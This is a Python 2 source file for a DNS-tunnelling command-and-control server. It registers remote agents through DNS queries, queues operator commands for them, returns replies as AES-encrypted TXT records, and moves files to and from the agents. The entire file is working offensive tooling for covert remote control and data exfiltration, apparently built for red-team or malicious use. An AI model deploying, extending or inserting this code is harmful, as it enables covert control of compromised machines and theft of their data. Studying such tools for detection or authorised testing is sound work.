import sys
sys.path.append('./lib/')
import dnslib
import time
from time import strftime
from datetime import datetime
import hashlib
import os
import base64
from os import fork, setsid, umask, dup2
from sys import stdin, stdout, stderr
import uuid
import random
import binascii
import string

try:
    from subprocess import getoutput
except ImportError:
    from commands import getoutput

import binascii
import socket
import struct
import threading
import time

try:
    import socketserver
except ImportError:
    import SocketServer as socketserver

import logging

import code
import pprint
import ConfigParser
from dnslib.dns import DNSRecord, DNSError, QTYPE, RCODE, RR, TXT
from dnslib.digparser import DigParser
from dnslib.server import DNSServer
from dnslib.server import BaseResolver
from dnslib.server import DNSLogger

"""
functions
"""


def print_error(message):
    print "[!] " + message
    return(1)


def print_info(message):
    print "[+] " + message
    return(1)


def print_status(message):
    print "[-] " + message
    return(1)


def print_success(message):
    print "[*] " + message
    return(1)


def print_normal(message):
    sys.stdout.write(message)
    return(1)


"""
encrypt message function
input: plain message
outupt: AES encrypted message
"""


def cryptmsg(message, key):

    if GConfig['plain'] == 1:
        logging.debug("encryption disabled")
        encoded = base64.b64encode(message)
    else:
        logging.debug("cryptmsg enter")

        # the block size for the cipher object; must be 16 per FIPS-197
        BLOCK_SIZE = 16

        # the character used for padding--with a block cipher such as AES, the value
        # you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
        # used to ensure that your value is always a multiple of BLOCK_SIZE
        PADDING = '{'

        # one-liner to sufficiently pad the text to be encrypted
        pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

        # one-liners to encrypt/encode and decrypt/decode a string
        # encrypt with AES, encode with base64
        EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))

        # create a cipher object using the random secret
        # print GConfig['key']
        cipher = AES.new(key)

        # encode a string
        encoded = EncodeAES(cipher, message)
        logging.debug("cryptmsg finish")
    return encoded


def decryptmsg(message, key):
    logging.debug("decryptmsg enter")
    if GConfig['plain'] == 1:
        logging.debug("encryption disabled")
        decoded = base64.b64decode(message)
    else:
        # the block size for the cipher object; must be 16 per FIPS-197
        BLOCK_SIZE = 16

        # the character used for padding--with a block cipher such as AES, the value
        # you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
        # used to ensure that your value is always a multiple of BLOCK_SIZE
        PADDING = '{'

        # one-liner to sufficiently pad the text to be encrypted
        pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

        # one-liners to encrypt/encode and decrypt/decode a string
        # encrypt with AES, encode with base64
        DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

        # create a cipher object using the random secret
        cipher = AES.new(key)

        # decode the encoded string
        decoded = DecodeAES(cipher, message)
        logging.debug("decryptmsg finish")
    return decoded


class Console(object):
    def __init__(self):
        self.command = ""

    def console(self):
        logging.debug("initializing console")
        while 1:
            self.command = raw_input("shell> ")
            self.console_dispatcher()
        exit(0)

    def console_dispatcher(self):
        logging.debug("Command: " + self.command)
        a_cmd = string.split(self.command, " ")
        if a_cmd[0] == "listeners":
            listerners()
        elif a_cmd[0] == "listener":
            create_listener()
        elif a_cmd[0] == "agents":
            show_agents()
        elif a_cmd[0] == "agent" and len(a_cmd[1]) > 0:
            if agent_exists(a_cmd[1]):
                interact_agent(a_cmd[1])
            elif alias_exists(a_cmd[1]):
                interact_agent(agent_alias(a_cmd[1]))
            else:
                print_error("Agent not found!")
        elif a_cmd[0] == "help":
            self.help()
        elif a_cmd[0] == "exit" or a_cmd[0] == "quit":
            exit(0)
        elif a_cmd[0] == "":
            return(1)
        else:
            print_error("Command not found")
            return(0)
        return(1)

    def help(self):
        print_normal("Context\n")
        print_normal("=======\n")
        print_normal("switch to defined context\n")
        print_normal("\n")
        print_normal("commands:\n")
        print_normal("agent | listener\n")
        print_normal("\n")
        print_normal("listener\n")
        print_normal("--------\n")
        print_normal("start/stop listener of defined m_type (DNS, ...)\n")
        print_normal("\n")
        print_normal("commands:\n")
        print_normal("start dns\n")
        print_normal("stop dns\n")
        print_normal("\n")
        print_normal("agent\n")
        print_normal("-----\n")
        print_normal("Working with connected agents; agent can be renamed or removed\n")
        print_normal("\n")
        print_normal("commands:\n")
        print_normal("rename <new alias>\n")
        print_normal("remove\n")
        print_normal("beacontime <time in s>\n")
        print_normal("\n")
        print_normal("info\n")
        print_normal("====\n")
        print_normal("show monitoring info about context entities\n")
        print_normal("\n")
        print_normal("command:\n")
        print_normal("agents | listerners\n")
        return(1)


def alias_exists(alias):
    if len(Agents) == 0:
        return(0)
    for i, v in enumerate(Agents):
        if alias == str(Agents[v][1]):
            return(1)
    return(0)


def agent_alias(alias):
    for i, v in enumerate(Agents):
        if alias == str(Agents[v][1]):
            return(v)


def agent_exists(agent):
    if agent in Agents:
        return(1)
    else:
        return(0)


def show_agents():
    if len(Agents) == 0:
        print_info("No agents found!")
        return(1)
    for i, v in enumerate(Agents):
        priv = ""
        if Agents[v][4] == 0:
            priv = "* "
        print_info(priv + "Agent id: " + str(i) + " Agent name: " + str(v) + " Alias: " + str(Agents[v][1]) + " IP: " + str(Agents[v][2]) + " last ping: " + str(round(time.time() - Agents[v][3], 2)) + "s ago" + " Session Key: " + binascii.hexlify(str(Agents[v][0])) + " User ID: " + str(Agents[v][4]))
    return(1)


def rename_agent(agent, name):
    Agents[agent][1] = name
    return(1)


def remove_agent(agent):
    command = "ASHUTDOWN"
    C2Commands[agent].append(command)
    time.sleep(2)
    del Agents[agent]
    del ABuffer[agent]
    del ACounter[agent]
    del AMsgID[agent]
    print_info("Agent %s removed!" % agent)
    logging.info("Agent %s removed!" % agent)
    return(1)


def upload_file(file, agent):
    try:
        logging.debug("reading file to global buffer")
        fh = open(file, "rb")
        buffer = fh.read()
        fh.close()
        f_length = len(buffer) / s_msg + 1
        logging.debug("File buffer length: %s" % f_length)
        logging.debug("File: %s" % buffer)
        ABuffer[agent] = buffer
        ACounter[agent] = 0
    except:
        print_error("File not found!")
        return(0)
    return(f_length)


def save_file(file, agent):
    # validace
    logging.debug("saving file")
    f_buffer = ""
    for msg in ABuffer[agent]:
        if msg is not None:
            logging.debug("MSG: %s" % msg)
            f_buffer = f_buffer + msg
    logging.debug("buffer length: %i" % len(f_buffer))
    fh = open(file, "wb")
    fh.write(f_buffer)
    fh.close()
    ABuffer[agent] = []


def file_up_status(agent):
    if len(ABuffer[agent]) > 0:
        print_info("Uploading part %s of %s" % (str(ACounter[agent]), str(len(ABuffer[agent]) / s_msg + 1)))
    else:
        print_info("Empty queue")
    return(1)


def file_dl_status(agent):
    if len(ABuffer[agent]) > 0:
        f_buffer = ""
        for msg in ABuffer[agent]:
            if msg is not None:
                f_buffer = f_buffer + msg
        print_info("Downloading part %s of %s" % (str(len(f_buffer)), str(ACounter[agent])))
    else:
        print_info("Empty queue")
    return(1)


def cls_queue(agent):
    ABuffer[agent] = []
    return(1)


def interact_agent(agent):
    while 1:
        if len(Agents[agent][1]) > 0:
            c_agent = Agents[agent][1]
        else:
            c_agent = agent
        command = raw_input("%s> " % c_agent)
        if len(command) > s_msg:
            logging.info("Command too long")
            print_error("Command too long (limit is 255)")
            continue
        logging.debug("Command %s for agent %s: " % (command, agent))
        a_cmd = string.split(command, " ")
        if len(a_cmd[0]) == 0:
            continue
        if a_cmd[0] == "exit" or a_cmd[0] == "back":
            return(1)
        if a_cmd[0] == "rename" and len(a_cmd[1]) > 0:
            rename_agent(agent, a_cmd[1])
            continue
        if a_cmd[0] == "remove":
            remove_agent(agent)
            return(1)
        if a_cmd[0] == "upstatus":
            file_up_status(agent)
            continue
        if a_cmd[0] == "dlstatus":
            file_dl_status(agent)
            continue
        if a_cmd[0] == "beacontime" and len(a_cmd[1]) > 0:
            command = "BEACONTIME " + a_cmd[1]
        if a_cmd[0] == "upload" and len(a_cmd[1]) > 0:
            logging.info("uploading file %s to agent %s" % (a_cmd[1], agent))
            f_length = upload_file(a_cmd[1], agent)
            command = command + " " + str(f_length)
            C2Commands[agent].append(command)
            C2Commands[agent].append("echo \"upload finished!\"")
            continue
        if a_cmd[0] == "download" and len(a_cmd[1]) > 0:
            logging.info("downloading file %s fom agent %s" % (a_cmd[1], agent))
        C2Commands[agent].append(command)
    return(1)


def register_agent(agent, body, ip):
    logging.debug("Registering agent %s from IP %s" % (agent, str(ip)))
    d_body = base64.b64decode(body)
    logging.debug("Body: %s" % d_body)
    # session key, name, ip, last ping, priviledged agent?
    Agents[agent] = [string.split(d_body, ";")[0], "", "", 0, -1]
    C2Commands[agent] = []
    C2Commands[agent].append("AGENTID")
    C2Commands[agent].append("AGENTIP")
    ABuffer[agent] = []
    ACounter[agent] = []
    AMsgID[agent] = 0
    logging.debug("Agent %s added" % agent)
    return(1)


def create_listener():
    logging.debug("Defining listener")
    while 1:
        command = raw_input("listener> ")
        logging.debug("Command: " + command)
        a_cmd = string.split(command, " ")
        if a_cmd[0] == "start" and a_cmd[1] == "dns":
            logging.debug("starting DNS listener")
            start_dns_server()
            Listeners['dns'] = "running"
            print_success("DNS listener started!")
            return(1)
        elif a_cmd[0] == "stop" and a_cmd[1] == "dns":
            logging.debug("stopping DNS listener")
            stop_dns_server()
            Listeners['dns'] = "stopped"
            print_success("DNS listener stopped!")
        elif a_cmd[0] == "exit" or a_cmd[0] == "back":
            return(1)
        else:
            print_error("listener command not found!")
            logging.debug("listener command not found!")
    return(1)


def listerners():
    if len(Listeners) == 0:
        print_info("No listeners defined!")
        return(1)
    for i, v in enumerate(Listeners):
        print_info("Listener id: " + str(i) + " m_type: " + str(v) + " Status: " + Listeners[v])
    return(1)


class DNSListResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = request.q.qname
        ip = handler.client_address[0]
        logging.info("Accepted new request %s!" % str(qname))
        m_type, message = handle_dns_request(str(qname), ip)
        if m_type == "0" and message == "0":
            reply = request.reply()
            reply.header.rcode = getattr(RCODE, 'NXDOMAIN')
            return reply
        reply = sendmsg(m_type, message, request, string.split(base64.b64decode(string.split(str(qname), ".")[0]), ";")[0])
        return(reply)


def sendmsg(m_type, message, request, agent):
        logging.debug("Sending response message")
        update_last_ping(agent)
        reply = request.reply()
        qname = request.q.qname
        l_msg = s_msg - 1
        logging.debug("message: %s " % message)
        logging.debug("msg len: %i " % len(message))
        reply.add_answer(RR(qname, QTYPE.TXT, ttl=1, rdata=TXT(cryptmsg(message, Agents[agent][0]))))
        reply.header.rcode = RCODE.NOERROR
        return(reply)


def handle_dns_request(request, ip):
    logging.debug("Handling request from IP: %s" % str(ip))
    request = string.rstrip(request, GConfig['domain'])
    request = string.rstrip(request, ".")
    r_dns = string.split(request, ".")
    for i in range(0, len(r_dns)):
        logging.debug("Request part %s = %s" % (str(i), str(r_dns[i])))
    logging.debug("Parsing protocol header")
    agent, m_type, msgid = parse_dns_header(r_dns[0])
    if agent == "0":
        return "0", "0"
    logging.debug("msg protocol %s %s %s" % (agent, m_type, msgid))

    # force reregistration
    if m_type != "RG" and agent not in Agents.keys():
        register_agent(agent, r_dns[1], ip)

    if m_type == "RG":
        if register_agent(agent, r_dns[1], ip):
            print_success("New agent %s registered!" % agent)
            return("RC", "OK")
        else:
            print_error("Agent %s registration failed" % agent)
            return("RC", "ERR")
    elif m_type == "RC":
        if len(C2Commands[agent]) > 0:
            command = C2Commands[agent].pop(0)
        else:
            command = "NOP"
        logging.error("Command %s for agent %s found in the list" % (command, agent))
        return("RC", command)
    elif m_type == "ID":
        message = decryptmsg(r_dns[1], Agents[agent][0])
        Agents[agent][4] = int(message)
        logging.debug("Agent %s has id %s" % (agent, str(message)))
        return("ID", "OK")
    elif m_type == "IP":
        message = decryptmsg(r_dns[1], Agents[agent][0])
        Agents[agent][2] = str(message)
        logging.debug("Agent %s has ip %s" % (agent, str(message)))
        return("IP", "OK")
    elif m_type == "UP":
        logging.debug("Uploading file")
        counter = int(decryptmsg(r_dns[1], Agents[agent][0]))
        ACounter[agent] = counter
        message = ABuffer[agent][ACounter[agent] * (s_msg):ACounter[agent] * (s_msg) + (s_msg)]
        if ACounter[agent] < len(ABuffer[agent]) / s_msg + 2:
            logging.debug("Uploading part %s of %s" % (str(ACounter[agent]), str(len(ABuffer[agent]) / s_msg + 1)))
            return("UP", message)
        else:
            ABuffer[agent] = []
    elif m_type == "SD":
        logging.debug("Start download")
        f_size = int(decryptmsg(r_dns[1], Agents[agent][0]))
        ACounter[agent] = f_size
        AMsgID[agent] = msgid
        ABuffer[agent] = [None] * (f_size + 1)
        logging.debug("File size: %i" % f_size)
        return("SD", "OK")
    elif m_type == "DL":
        logging.debug("Downloading file")
        nr_dns = r_dns
        nr_dns.pop(0)

        n_request = string.join(nr_dns, sep="")
        c_message = string.replace(n_request, ".", "")
        message = decryptmsg(c_message, Agents[agent][0])
        index = msgid - AMsgID[agent] - 2
        logging.debug("inserting %s on position %i" % (message, index))
        ABuffer[agent][index] = message
        return("DL", "OK")
    elif m_type == "FD":
        logging.debug("Download finished")
        nr_dns = r_dns
        nr_dns.pop(0)

        n_request = string.join(nr_dns, sep="")
        c_message = string.replace(n_request, ".", "")
        s_file = decryptmsg(c_message, Agents[agent][0])
        save_file(s_file, agent)
        print_info("Download finished!")
        return("FD", "OK")
    elif m_type == "SM":
        logging.debug("receiving message")
        nr_dns = r_dns
        nr_dns.pop(0)

        n_request = string.join(nr_dns, sep="")
        c_message = string.replace(n_request, ".", "")
        message = decryptmsg(c_message, Agents[agent][0])
        print_normal(message)
        return("RM", "OK")
    else:
        logging.error("Unknown message m_type!")


def parse_dns_header(header):
    b_header = base64.b64decode(header)
    f_header = string.split(b_header, sep=";")
    if len(f_header) == 3:
        logging.debug("parsed header: %s %s %s" % (str(f_header[0]), str(f_header[1]), str(f_header[2])))
        return str(f_header[0]), str(f_header[1]), int(f_header[2])
    else:
        logging.debug("parsed header: %s" % str(b_header))
        return "0", "0", "0"


def update_last_ping(agent):
    try:
        Agents[agent][3] = time.time()
    except:
        logging.debug("Ping time update of agent %s failed!" % agent)
    return(1)


def start_dns_server():
    global server
    logging.info("starting dns server thread ... ")
    logging.debug("Binding on IP:" + GConfig["dnsserver"])
    resolver = DNSListResolver()
    logger = DNSLogger(log="+send", prefix=False)
    server = DNSServer(resolver, port=GConfig['port'], address=GConfig['dnsserver'], logger=logger)
    server.start_thread()
    return(1)


def stop_dns_server():
    global server
    logging.debug("stopping dns server thread ... ")
    server.stop()
    del server
    return(1)

"""
main()
"""
try:
    config = ConfigParser.RawConfigParser()
    config.read('./config/server.cfg')
except:
    print "Cannot load configuration!"
    exit(1)

# parse configuration file
GConfig = {}
GConfig['domain'] = config.get('main', 'domain')
GConfig['loglevel'] = config.get('main', 'loglevel')
GConfig['dnsserver'] = config.get('main', 'dnsserver')
GConfig['logfile'] = config.get('main', 'logfile')
GConfig['port'] = int(config.get('main', 'port'))
GConfig['plain'] = int(config.get('main', 'plain'))
GConfig['msgid'] = 0

if GConfig['loglevel'] == "DEBUG":
    loglevel = logging.DEBUG
elif GConfig['loglevel'] == "INFO":
    loglevel = logging.INFO
elif GConfig['loglevel'] == "WARNING":
    loglevel = logging.WARNING
elif GConfig['loglevel'] == "ERROR":
    loglevel = logging.ERROR
elif GConfig['loglevel'] == "CRITICAL":
    loglevel = logging.CRITICAL
else:
    loglevel = logging.NOTSET
logging.basicConfig(filename=GConfig['logfile'], level=loglevel, format='%(asctime)s.%(msecs)d %(levelname)s %(funcName)s: %(message)s', datefmt="%Y-%m-%d %H:%M:%S")

logging.debug("home domain: " + str(GConfig['domain']))
logging.debug("Log level: " + str(GConfig['loglevel']))
logging.debug("dnsserver: " + str(GConfig['dnsserver']))
logging.debug("logfile: " + str(GConfig['logfile']))
logging.debug("port: " + str(GConfig['port']))
logging.debug("plain: " + str(GConfig['plain']))

if GConfig['plain'] == 0:
    from Crypto.Cipher import AES

Listeners = {}
Agents = {}
C2Commands = {}
ABuffer = {}
ACounter = {}
AMsgID = {}
s_msg = 180

cns = Console()
cns.console()

exit(0)
